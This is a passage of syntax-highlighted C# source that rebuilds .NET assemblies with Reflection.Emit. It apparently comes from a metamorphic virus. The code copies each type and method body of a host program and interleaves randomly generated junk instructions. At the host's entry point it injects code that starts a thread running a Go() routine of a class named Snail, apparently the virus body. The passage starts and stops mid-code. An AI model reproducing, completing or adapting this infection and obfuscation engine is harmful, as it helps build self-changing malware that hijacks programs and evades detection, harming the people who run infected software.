                        </span><span class="sc11">ab</span><span class="sc10">.</span><span class="sc11">SetEntryPoint</span><span class="sc10">(</span><span class="sc11">outmb</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filetype</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc5">else</span><span class="sc0">
                        </span><span class="sc11">CreateMethodBody</span><span class="sc10">(</span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">methodBody</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">il</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shorts</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            
            </span><span class="sc11">TypeBuilder</span><span class="sc0"> </span><span class="sc11">outclassb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">.</span><span class="sc11">TypeCompliance</span><span class="sc10">(</span><span class="sc11">type</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc5">try</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">outclassb</span><span class="sc10">.</span><span class="sc11">CreateType</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc10">(</span><span class="sc11">NotSupportedException</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">// if cannot create type with short br's, try again with long ones
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">shorts</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">shorts</span><span class="sc10">=</span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">nestedClasses</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">GetNestedTypes</span><span class="sc10">(</span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Public</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">NonPublic</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Static</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Instance</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">DeclaredOnly</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">foreach</span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">nestedClass</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">nestedClasses</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">EmitType</span><span class="sc10">(</span><span class="sc11">nestedClass</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">reader</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">asm</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">ab</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">setEP</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filetype</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">ManagedResourcesPresent</span><span class="sc10">(</span><span class="sc11">Assembly</span><span class="sc0"> </span><span class="sc11">asm</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">resources</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">asm</span><span class="sc10">.</span><span class="sc11">GetManifestResourceNames</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">resources</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc9">#if MANAGEDRESOURCES
</span><span class="sc0">        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">CreateResources</span><span class="sc10">(</span><span class="sc11">Assembly</span><span class="sc0"> </span><span class="sc11">asm</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">AssemblyBuilder</span><span class="sc0"> </span><span class="sc11">ab</span><span class="sc10">,</span><span class="sc0"> 
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">resources</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">asm</span><span class="sc10">.</span><span class="sc11">GetManifestResourceNames</span><span class="sc10">();</span><span class="sc0">
            
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">            </span><span class="sc11">Module</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">modules</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">asm</span><span class="sc10">.</span><span class="sc11">GetModules</span><span class="sc10">(</span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">modules</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">modules</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">IsResource</span><span class="sc10">())</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"RESOURCE MODULE"</span><span class="sc10">+</span><span class="sc11">modules</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">Name</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc5">foreach</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">res</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">resources</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">Stream</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">asm</span><span class="sc10">.</span><span class="sc11">GetManifestResourceStream</span><span class="sc10">(</span><span class="sc11">res</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">tp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc10">.</span><span class="sc11">GetType</span><span class="sc10">();</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">

                    </span><span class="sc5">try</span><span class="sc0"> 
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">ResourceReader</span><span class="sc0"> </span><span class="sc11">rr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ResourceReader</span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// ArgumentException 
</span><span class="sc0">                        </span><span class="sc11">Hashtable</span><span class="sc0"> </span><span class="sc11">rsrc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Hashtable</span><span class="sc10">();</span><span class="sc0">
                        </span><span class="sc11">IDictionaryEnumerator</span><span class="sc0"> </span><span class="sc11">enumerator</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rr</span><span class="sc10">.</span><span class="sc11">GetEnumerator</span><span class="sc10">();</span><span class="sc0">
                        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">enumerator</span><span class="sc10">.</span><span class="sc11">MoveNext</span><span class="sc10">())</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">rsrc</span><span class="sc10">.</span><span class="sc11">ContainsKey</span><span class="sc10">(</span><span class="sc11">enumerator</span><span class="sc10">.</span><span class="sc11">Key</span><span class="sc10">))</span><span class="sc0">
                                </span><span class="sc11">rsrc</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">enumerator</span><span class="sc10">.</span><span class="sc11">Key</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">enumerator</span><span class="sc10">.</span><span class="sc11">Value</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc11">rr</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
    
                        </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">Path</span><span class="sc10">.</span><span class="sc11">GetFileNameWithoutExtension</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">)+</span><span class="sc0">
                                </span><span class="sc6">".resources"</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">IResourceWriter</span><span class="sc0"> </span><span class="sc11">rw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ab</span><span class="sc10">.</span><span class="sc11">DefineResource</span><span class="sc10">(</span><span class="sc11">res</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">
    
                        </span><span class="sc11">IDictionaryEnumerator</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rsrc</span><span class="sc10">.</span><span class="sc11">GetEnumerator</span><span class="sc10">();</span><span class="sc0">

                        </span><span class="sc2">//     
</span><span class="sc0">                        </span><span class="sc2">// add .resources file to assembly 
</span><span class="sc0">                        
                        </span><span class="sc11">n</span><span class="sc10">.</span><span class="sc11">Reset</span><span class="sc10">();</span><span class="sc0">
                        </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">n</span><span class="sc10">.</span><span class="sc11">MoveNext</span><span class="sc10">())</span><span class="sc0">
                            </span><span class="sc11">rw</span><span class="sc10">.</span><span class="sc11">AddResource</span><span class="sc10">((</span><span class="sc16">string</span><span class="sc10">)</span><span class="sc11">n</span><span class="sc10">.</span><span class="sc11">Key</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc5">object</span><span class="sc10">)</span><span class="sc11">n</span><span class="sc10">.</span><span class="sc11">Value</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">rw</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc5">catch</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc9">#endif
</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">shorts</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">CreateMethodBody</span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MethodBase</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MethodBody</span><span class="sc0"> </span><span class="sc11">methodBody</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">ILGenerator</span><span class="sc0"> </span><span class="sc11">il</span><span class="sc10">,</span><span class="sc0"> 
            </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">entrypoint</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">shorts</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Objects</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"// Code Size: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">methodBody</span><span class="sc10">.</span><span class="sc11">CodeSize</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" Bytes"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">".maxstack "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">methodBody</span><span class="sc10">.</span><span class="sc11">MaxStack</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc2">// Local variables
</span><span class="sc0">            </span><span class="sc11">Type</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">locals</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">methodBody</span><span class="sc10">.</span><span class="sc11">GetLocals</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">LocalBuilder</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">lbuilders</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">LocalBuilder</span><span class="sc10">[</span><span class="sc11">locals</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">locals</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">locals</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">".locals ("</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">locals</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">locals</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"V_"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">locals</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0"> 
                        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">", "</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                    </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc10">=</span><span class="sc11">objects</span><span class="sc10">.</span><span class="sc11">TypeCompliance</span><span class="sc10">(</span><span class="sc11">locals</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">lbuilders</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">DeclareLocal</span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">else</span><span class="sc0"> 
                        </span><span class="sc11">lbuilders</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">DeclareLocal</span><span class="sc10">(</span><span class="sc11">locals</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">")"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">RandomCodeEmitter</span><span class="sc0"> </span><span class="sc11">rce</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">RandomCodeEmitter</span><span class="sc10">(</span><span class="sc11">il</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lbuilders</span><span class="sc10">);</span><span class="sc0">
            
            </span><span class="sc11">LocalBuilder</span><span class="sc0"> </span><span class="sc11">loc</span><span class="sc10">=</span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc2">// if this method is EP, add constructor and Go() method call
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">entrypoint</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">MethodBuilder</span><span class="sc0"> </span><span class="sc11">go</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">.</span><span class="sc11">MethodCompliance</span><span class="sc10">(</span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">Snail</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">goBase</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">loc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">DeclareLocal</span><span class="sc10">(</span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">.</span><span class="sc11">Thread</span><span class="sc10">));</span><span class="sc0">
                </span><span class="sc11">rce</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Ldnull</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">rce</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Ldftn</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">go</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">rce</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">thrStart</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">.</span><span class="sc11">ThreadStart</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">ConstructorInfo</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">carray</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">thrStart</span><span class="sc10">.</span><span class="sc11">GetConstructors</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">ConstructorInfo</span><span class="sc0"> </span><span class="sc11">ctorThreadStart</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">carray</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Newobj</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ctorThreadStart</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">t2</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Type</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc11">t2</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">.</span><span class="sc11">ThreadStart</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">ConstructorInfo</span><span class="sc0"> </span><span class="sc11">ctorThread</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">.</span><span class="sc11">Thread</span><span class="sc10">)).</span><span class="sc11">GetConstructor</span><span class="sc10">(</span><span class="sc11">t2</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Newobj</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ctorThread</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">rce</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Stloc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">loc</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">rce</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Ldloc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">loc</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">MethodInfo</span><span class="sc0"> </span><span class="sc11">miStart</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">.</span><span class="sc11">Thread</span><span class="sc10">).</span><span class="sc11">GetMethod</span><span class="sc10">(</span><span class="sc6">"Start"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Callvirt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">miStart</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">rce</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">// Exception handlers
</span><span class="sc0">            </span><span class="sc11">ExceptionHandler</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">exceptions</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">methodBody</span><span class="sc10">.</span><span class="sc11">GetExceptions</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc2">//Exc [] exc = new Exc [exceptions.Length];
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">exceptions</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">exceptions</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">ExceptionHandler</span><span class="sc0"> </span><span class="sc11">handler</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">exceptions</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">".try"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
